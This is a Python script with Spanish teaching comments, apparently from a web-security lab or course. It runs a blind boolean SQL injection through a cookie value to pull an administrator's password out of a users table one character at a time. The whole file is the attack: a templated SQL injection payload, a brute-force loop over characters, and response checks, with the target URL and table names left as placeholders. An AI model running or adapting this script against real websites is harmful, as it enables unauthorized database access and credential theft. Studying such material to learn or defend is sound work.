"""
Conocida cómo shebang o hashbang, quiere decir que el interprete del código sea python3.
"""
#!/usr/bin/python3 

"""
LIBRERIAS
[pwn]: Importa (*) todas las funciones y clases de la librería. Incluye conexiones de red, manipulación de datos binarios,
creación de archivos shellcode, creación de payloads maliciosos

[requests]:Sirve para enviar solicitudes HTTP através de la red.

[signal]:Sirve para interactuar con señales del sistema operativo.

[time]:Sirve para trabajar con el tiempo y las fechas.

[pdb]:Sirve para depurar el código.

[sys]:Sirve para interactuar con el interprete de python y el sistema operativo principal.

[string]:Sirve para modificar y trabajar con cadenas de texto.
"""
from pwn import * 
import requests, signal, time, pdb, sys, string


"""
[def_handler]: Sirve para decir cuando seguir o cuando detenerse.

[sig]: Es la señal que activo la función.

[SIGINT]: Cuando el usuario presiona ctrl+c.

[frame]: Es como el que sabe donde está todo.
"""


def def_handler(sig,frame):
    print("\n\n[!] saliendo.... \n") #[\n]: Crean una nueva linea
    sys.exit(1) #Indicamos que estamos forzando al programa para que termine

#Ctrl C para salir
signal.signal(signal.SIGINT, def_handler)

#Dicionario de caracteres
caracteres=string.ascii_lowercase + string.digits 

#URL principal
url_principal="https://pegar:el_url_principal" #Hay que agregarle [https://]

#Debemos saber el número límite de la contraseña paso #6.2.1.2
numero_limite_de_la_contraseña=0

def crear_petición():
    contrasena=""#En esta variable vamos a guardar la contraseña

    barra_progreso=log.progress("Fuerza bruta") #Él [log.progress] hace parte de la librería pwntools
    barra_progreso.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)#Para que pueda ver el usuario el mensaje "Iniciando ataque de fuerza bruta"

    barra_progreso_contrasena=log.progress("password")

    for posicion in range(1,numero_limite_de_la_contraseña):#Este bucle nos servirá para movernos de posiciones
        for caracter in caracteres:#Este bucle nos servirá para buscar la letra o número correcta en esa posiciíon
        
            #Organizamos la cookies de burp suite en un diccionario
            cookies_dicionario = {
                'cookie_1_ataque': "valores_random_1' AND (SELECT SUBSTRING( << Password | column_1 >> ,%d,1) FROM << Usuarios | Table_name >> WHERE << Usuario | Column_2 >> = ' << Administrador | Nombre_del_usuario >> ')='%s" %(posicion,caracter),
                'cookie_2': 'Valores random_2'
            }

            barra_progreso.status(cookies_dicionario['cookie_1_ataque'])#Para ver en la barra de progreso, los cambios que se van haciendo.
            solicitud= requests.get(url_principal, cookies=cookies_dicionario)#Guardar las peticiones
            
            if "Objeto_clave" in solicitud.text: #validamos que este el objeto clave en la respuesta.
                contrasena+= caracter
                barra_progreso_contrasena.status(contrasena)
                break

#Funcion principal        
if __name__=='__main__':
    crear_petición()